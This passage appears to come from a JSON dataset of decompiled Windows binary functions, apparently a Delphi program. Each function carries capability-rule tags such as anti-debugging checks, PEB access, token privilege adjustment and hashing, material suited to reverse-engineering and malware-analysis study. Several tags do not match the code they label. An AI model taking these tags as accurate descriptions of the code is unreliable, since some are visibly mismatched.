sub.advapi32.dll_LookupPrivilegeValueA(0, uVar2);\n            if (iVar1 != 0) {\n                var_20h = 1;\n                if (param_2 == '\\0') {\n                    var_14h = 0;\n                }\n                else if (param_2 == '\\x01') {\n                    var_14h = 2;\n                }\n                var_10h = 0;\n                var_30h = 1;\n                uStack48 = var_1ch;\n                uStack44 = uStack28;\n                uStack40 = var_14h;\n                in_stack_ffffff6c = TokenHandle;\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (TokenHandle, 0, &fcn.0048a02c::var_20h, 0x10, &fcn.0048a02c::var_30h, &fcn.0048a02c::var_10h)\n                ;\n            }\n            *in_FS_OFFSET = in_stack_ffffff6c;\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48a11e);\n            return;\n        }\n        puStack104 = 0x48a123;\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        var_5h = iVar1 == 0;\n        *in_FS_OFFSET = uStack100;\n    }\n    else {\n        *in_FS_OFFSET = uStack88;\n        puStack68 = &stack0xfffffffc;\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x48a161;\n    uStack84 = 0x48a159;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 883
    },
    "00421968": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.00421968(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = 4;\n    arg_8h = auStack8;\n    fcn.00421a64(arg_8h, 4);\n    if (uVar1 != '\\x03') {\n        fcn.00420ea0();\n    }\n    return CONCAT44(uVar1, arg_8h);\n}\n",
        "token_count": 105
    },
    "00453738": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00453738(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x45374f;\n    iVar1 = fcn.00453b18();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x453763;\n    iVar1 = fcn.00404610();\n    puStack32 = 0x45376e;\n    fcn.00453634();\n    uStack36 = 0x453826;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00453b18();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00453adc();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.00453adc();\n                fcn.00419680();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x45382d;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x4537e0;\n        iVar2 = fcn.004197d8();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x4537f1;\n            fcn.0044f048();\n        }\n        else {\n            uStack36 = 0x4537fc;\n            fcn.0044f048();\n        }\n        uStack36 = 0x45380b;\n        fcn.004196cc();\n    }\n    uStack36 = 0x45381d;\n    fcn.00404640();\n    uStack36 = 0x453825;\n    fcn.0045363c();\n    return;\n}\n",
        "token_count": 499
    },
    "0046ae60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046ae60(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    char *pcVar2;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar3;\n    \n    pcVar4 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    pcVar5 = *(in_EAX + 0x34) + param_2;\n    if ((*pcVar5 == *pcVar4) && (pcVar5[1] == pcVar4[1])) {\n        pcVar5 = pcVar5 + 2;\n        pcVar3 = pcVar4 + 2;\n        while (((((pcVar2 = pcVar3 + 1,  *pcVar2 == pcVar5[1] && (pcVar2 = pcVar3 + 2,  *pcVar2 == pcVar5[2])) &&\n                 (pcVar2 = pcVar3 + 3,  *pcVar2 == pcVar5[3])) &&\n                ((pcVar2 = pcVar3 + 4,  *pcVar2 == pcVar5[4] && (pcVar2 = pcVar3 + 5,  *pcVar2 == pcVar5[5])))) &&\n               ((pcVar2 = pcVar3 + 6,  *pcVar2 == pcVar5[6] && (pcVar2 = pcVar3 + 7,  *pcVar2 == pcVar5[7]))))) {\n            pcVar2 = pcVar3 + 8;\n            pcVar5 = pcVar5 + 8;\n            if ((*pcVar2 != *pcVar5) || (pcVar3 = pcVar2,  pcVar4 + 0x102 <= pcVar2)) break;\n        }\n        uVar1 = 0x102 - ((pcVar4 + 0x102) - pcVar2);\n        if (uVar1 < 3) {\n            uVar1 = 2;\n        }\n        else {\n            *(in_EAX + 0x6c) = param_2;\n            if (*(in_EAX + 0x70) < uVar1) {\n                uVar1 = *(in_EAX + 0x70);\n            }\n        }\n    }\n    else {\n        uVar1 = 2;\n    }\n    return uVar1;\n}\n",
        "token_count": 541
    },
    "0048bf28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0048bf28(void)\n\n{\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1(0x400, 0x5a, auStack12, 5);\n    if (iVar1 == 3) {\n        fcn.00405664();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00403e48": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e48(char *param_1, int32_t param_2)\n\n{\n    uint64_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char acStack37 [21];\n    int32_t iStack16;\n    \n    iStack16 = param_2;\n    uVar2 = (in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f);\n    iVar4 = 0;\n    do {\n        iVar3 = iVar4;\n        uVar1 = uVar2;\n        uVar2 = uVar2 / 10;\n        acStack37[iVar3 + 1] = uVar1 % 10 + '0';\n        iVar4 = iVar3 + 1;\n    } while (uVar2 != 0);\n    if (in_EAX < 0) {\n        acStack37[iVar3 + 2] = '-';\n        iVar4 = iVar3 + 2;\n    }\n    *param_1 = iVar4;\n    pcVar5 = param_1 + 1;\n    if (0xff < iStack16) {\n        iStack16 = 0xff;\n    }\n    iVar3 = iStack16 - iVar4;\n    if (iVar3 != 0 && iVar4 <= iStack16) {\n        *param_1 = *param_1 + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *pcVar5 = ' ';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    do {\n        *pcVar5 = acStack37[iVar4];\n        pcVar5 = pcVar5 + 1;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 422
    },
    "00405258": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid fcn.00405258(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar2 = 0x10;\n    iVar1 = *0x490000;\n    do {\n        \"Runtime error     at 00000000\"[uVar2 & 0xff] = iVar1 % 10 + '0';\n        iVar1 = iVar1 / 10;\n        uVar2 = uVar2 - 1;\n    } while (iVar1 != 0);\n    uVar3 = 0x1c;\n    uVar2 = *0x490004;\n    do {\n        \"Runtime error     at 00000000\"[uVar3 & 0xff] = str.0123456789ABCDEF[uVar2 & 0xf];\n        uVar2 = uVar2 / 0x10;\n        uVar3 = uVar3 - 1;\n    } while (uVar2 != 0);\n    return;\n}\n",
        "token_count": 221
    },
    "00409cb2": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409cb2(uint param_1, uint32_t param_2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    do {\n        uVar1 = in_EAX;\n        in_EAX = in_EAX / 10;\n        puVar6 = puVar6 + -1;\n        cVar4 = uVar1 % 10;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n    } while (in_EAX != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar2 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar2)[iVar5] = 0x30;\n        }\n        puVar6[iVar2] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0040b06c": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040b06c(int32_t param_1, uint32_t param_2)\n\n{\n    char cVar2;\n    uint in_EAX;\n    uint32_t uVar1;\n    char unaff_BL;\n    uint32_t *puVar3;\n    uchar *unaff_EDI;\n    char *pcVar4;\n    uint32_t uStack8;\n    \n    *unaff_EDI = in_EAX;\n    if (unaff_BL == '\\0') {\n        param_2 = 0;\ncode_r0x0040b082:\n        cVar2 = in_EAX >> 8;\n        pcVar4 = unaff_EDI + 1;\n        if (cVar2 == '\\0') goto code_r0x0040b089;\n    }\n    else {\n        if (-1 < param_2) goto code_r0x0040b082;\n        cVar2 = '-';\n        param_2 = -param_2;\n    }\n    pcVar4 = unaff_EDI + 2;\n    unaff_EDI[1] = cVar2;\ncode_r0x0040b089:\n    puVar3 = &uStack8;\n    uStack8 = param_2;\n    do {\n        do {\n            uVar1 = param_2 / *0x490884;\n            *puVar3 = param_2 % *0x490884 + '0';\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + -1;\n            param_2 = uVar1;\n        } while (uVar1 != 0);\n    } while (0 < param_1);\n    do {\n        puVar3 = puVar3 + -1;\n        *pcVar4 = *puVar3;\n        pcVar4 = pcVar4 + 1;\n    } while (puVar3 != &uStack8);\n    return uStack8;\n}\n",
        "token_count": 420
    },
    "0040b4d3": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4d3(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar7;\n    uint16_t uVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar8;\n    uint8_t uVar9;\n    uint32_t uVar10;\n    int16_t *unaff_EBX;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    float10 fVar15;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    uVar6 = *unaff_ESI;\n    uVar10 = unaff_ESI[1];\n    if ((uVar6 | uVar10) != 0) {\n        if (uVar10 < 0) {\n            bVar14 = uVar6 != 0;\n            uVar6 = -uVar6;\n            uVar10 = -bVar14 - uVar10;\n        }\n        iVar8 = 0;\n        iVar11 = *(unaff_EBP + 8);\n        if (iVar11 < 0) {\n            iVar11 = 0;\n        }\n        if (3 < iVar11) {\n            iVar11 = 4;\n            uVar2 = uVar6;\n            iVar3 = iVar8;\n            do {\n                iVar8 = iVar3;\n                uVar6 = uVar2;\n                bVar14 = 0xde0b6b2 < uVar10;\n                uVar1 = uVar10 + 0xf21f494d;\n                uVar10 = uVar1 - (uVar6 < 0xa7640000);\n                uVar2 = uVar6 + 0x589c0000;\n                iVar3 = iVar8 + 1;\n            } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);\n            uVar10 = uVar10 + 0xde0b6b3 + (0x589bffff < uVar6 + 0x589c0000);\n        }\n        *(unaff_EBP + -0x20) = uVar6;\n        *(unaff_EBP + -0x1c) = uVar10;\n        fVar15 = *(unaff_EBP + -0x20);\n        if (4 - iVar11 != 0) {\n            fVar15 = fVar15 / *(*(unaff_EBP + -4) + 0x40b4bf + (4 - iVar11) * 4);\n        }\n        *(unaff_EBP + -0x18) = fVar15;\n        piVar12 = unaff_EBX + 3;\n        if (iVar8 != 0) {\n            piVar13 = unaff_EBX + 2;\n            *piVar12 = iVar8 + '0';\n            iVar8 = 9;\n            goto code_r0x0040b56a;\n        }\n        iVar8 = 9;\n        do {\n            uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n            uVar4 = CONCAT11(uVar9, uVar9 >> 4);\n            piVar13 = piVar12;\n            if (uVar9 >> 4 != 0) goto code_r0x0040b573;\n            uVar7 = uVar4 >> 8;\n            if ((uVar9 & 0xf) != 0) goto code_r0x0040b57a;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n    }\n    iVar5 = 0;\n    uVar9 = 0;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b5a0:\n    *unaff_EBX = iVar5;\n    *(unaff_EBX + 1) = uVar9;\n    return;\ncode_r0x0040b57a:\n    while( true ) {\n        piVar13 = piVar12 + 1;\n        *piVar12 = (uVar7 & 0xf) + 0x30;\n        iVar8 = iVar8 + -1;\n        if (iVar8 == 0) break;\ncode_r0x0040b56a:\n        uVar9 = *(iVar8 + -0x19 + unaff_EBP);\n        uVar4 = CONCAT11(uVar9, uVar9 >> 4);\ncode_r0x0040b573:\n        uVar7 = uVar4 >> 8;\n        piVar12 = piVar13 + 1;\n        *piVar13 = uVar4 + '0';\n    }\n    iVar5 = piVar13 - (unaff_EBX + 3 + iVar11);\n    do {\n        *piVar13 = '\\0';\n        piVar13 = piVar13 + -1;\n    } while (*piVar13 == '0');\n    uVar9 = unaff_ESI[1] >> 0x1f;\n    goto code_r0x0040b5a0;\n}\n",
        "token_count": 1160
    },
    "00443ddc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00443ddc(void)\n\n{\n    fcn.0040f8b8();\n    return;\n}\n",
        "token_count": 27
    },
    "0040a7a0": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a7a0(uint arg_8h, uint arg_ch)\n\n{\n    uint var_12h;\n    int16_t var_eh;\n    int16_t var_ch;\n    uint var_ah;\n    uint16_t var_6h;\n    uint var_4h;\n    \n    fcn.0040bbc4(arg_8h, arg_ch);\n    if ((var_6h < 0x7bc) || (0x83b < var_6h)) {\n        var_4h = 0;\n    }\n    else {\n        fcn.0040b8e4(&var_12h, arg_8h, arg_ch);\n        var_4h = CONCAT22(var_ah._2_2_ << 5 | var_ah | (var_6h - 0x7bc) * 0x200, \n                          var_12h._2_2_ >> 1 | var_eh << 5 | var_ch << 0xb);\n    }\n    return var_4h;\n}\n",
        "token_count": 241
    },
    "00419cdc": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00419cdc(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 4) + 0x1f;\n    if (iVar1 < 0) {\n        iVar1 = *(in_EAX + 4) + 0x3e;\n    }\n    iStack16 = param_1;\n    if (-1 < (iVar1 >> 5) + -1) {\n        iVar3 = 0;\n        iStack16 = iVar1 >> 5;\n        do {\n            if (*0x419d50 != *(*(in_EAX + 8) + iVar3 * 4)) {\n                uVar2 = 0;\n                do {\n                    bVar4 = uVar2 < 0x1f;\n                    if (uVar2 < 0x20) {\n                        bVar4 = (*(*(in_EAX + 8) + iVar3 * 4) >> (uVar2 & 0x1f) & 1) != 0;\n                    }\n                    if (!bVar4) {\n                        iVar1 = iVar3 * 0x20 + (uVar2 & 0x7f);\n                        if (*(in_EAX + 4) <= iVar1) {\n                            iVar1 = *(in_EAX + 4);\n                        }\n                        goto code_r0x00419d48;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 != ' ');\n            }\n            iVar3 = iVar3 + 1;\n            iStack16 = iStack16 + -1;\n        } while (iStack16 != 0);\n    }\n    iVar1 = *(in_EAX + 4);\ncode_r0x00419d48:\n    return CONCAT44(iStack16, iVar1);\n}\n",
        "token_count": 433
    },
    "0045e0a8": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e0a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    uVar3 = in_EAX[1];\n    uVar4 = in_EAX[2];\n    uVar1 = in_EAX[3];\n    uVar2 = *in_EAX + *param_2 + *0x491794 + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x491798 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar4 = uVar4 + param_2[2] + *0x49179c + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar5 = (uVar4 * 0x20000 | uVar4 >> 0xf) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x4917a0 + ((uVar2 ^ uVar1) & uVar5 ^ uVar2);\n    uVar6 = (uVar3 * 0x400000 | uVar3 >> 10) + uVar5;\n    uVar2 = uVar2 + param_2[4] + *0x4917a4 + ((uVar1 ^ uVar5) & uVar6 ^ uVar1);\n    uVar4 = (uVar2 * 0x80 | uVar2 >> 0x19) + uVar6;\n    uVar1 = uVar1 + param_2[5] + *0x4917a8 + ((uVar5 ^ uVar6) & uVar4 ^ uVar5);\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar4;\n    uVar5 = uVar5 + param_2[6] + *0x4917ac + ((uVar6 ^ uVar4) & uVar3 ^ uVar6);\n    uVar2 = (uVar5 * 0x20000 | uVar5 >> 0xf) + uVar3;\n    uVar6 = uVar6 + param_2[7] + *0x4917b0 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar6 * 0x400000 | uVar6 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x4917b4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[9] + *0x4917b8 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x4917bc + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xb] + *0x4917c0 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x4917c4 + ((uVar3 ^ uVar2) & uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x80 | uVar4 >> 0x19) + uVar1;\n    uVar3 = uVar3 + param_2[0xd] + *0x4917c8 + ((uVar2 ^ uVar1) & uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x1000 | uVar3 >> 0x14) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x4917cc + ((uVar1 ^ uVar4) & uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x20000 | uVar2 >> 0xf) + uVar3;\n    uVar1 = uVar1 + param_2[0xf] + *0x4917d0 + ((uVar4 ^ uVar3) & uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x4917d4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[6] + *0x4917d8 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + str.QZ._0_4_ + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + *param_2 + *0x4917e0 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x4917e4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[10] + *0x4917e8 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x4917ec + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[4] + *0x4917f0 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x4917f4 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[0xe] + *0x4917f8 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x4917fc + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[8] + *0x491800 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x491804 + ((uVar2 ^ uVar1) & uVar3 ^ uVar2);\n    uVar4 = (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar1;\n    uVar3 = uVar3 + param_2[2] + *0x491808 + ((uVar1 ^ uVar4) & uVar2 ^ uVar1);\n    uVar3 = (uVar3 * 0x200 | uVar3 >> 0x17) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x49180c + ((uVar4 ^ uVar3) & uVar1 ^ uVar4);\n    uVar2 = (uVar2 * 0x4000 | uVar2 >> 0x12) + uVar3;\n    uVar1 = uVar1 + param_2[0xc] + *0x491810 + ((uVar3 ^ uVar2) & uVar4 ^ uVar3);\n    uVar1 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar2;\n    uVar4 = uVar4 + param_2[5] + *0x491814 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[8] + *0x491818 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xb] + *0x49181c + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[0xe] + *0x491820 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[1] + *0x491824 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[4] + *0x491828 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[7] + *0x49182c + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[10] + *0x491830 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[0xd] + *0x491834 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + *param_2 + *0x491838 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[3] + *0x49183c + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[6] + *0x491840 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + param_2[9] + *0x491844 + (uVar2 ^ uVar1 ^ uVar3);\n    uVar4 = (uVar4 * 0x10 | uVar4 >> 0x1c) + uVar1;\n    uVar3 = uVar3 + param_2[0xc] + *0x491848 + (uVar1 ^ uVar4 ^ uVar2);\n    uVar3 = (uVar3 * 0x800 | uVar3 >> 0x15) + uVar4;\n    uVar2 = uVar2 + param_2[0xf] + *0x49184c + (uVar4 ^ uVar3 ^ uVar1);\n    uVar2 = (uVar2 * 0x10000 | uVar2 >> 0x10) + uVar3;\n    uVar1 = uVar1 + param_2[2] + *0x491850 + (uVar3 ^ uVar2 ^ uVar4);\n    uVar1 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar2;\n    uVar4 = uVar4 + *param_2 + *0x491854 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[7] + *0x491858 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[0xe] + *0x49185c + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[5] + *0x491860 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[0xc] + *0x491864 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[3] + *0x491868 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[10] + *0x49186c + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[1] + *0x491870 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[8] + *0x491874 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xf] + *0x491878 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[6] + *0x49187c + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[0xd] + *0x491880 + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[4] + *0x491884 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xb] + *0x491888 + ((~uVar2 | uVar4) ^ uVar1);\n    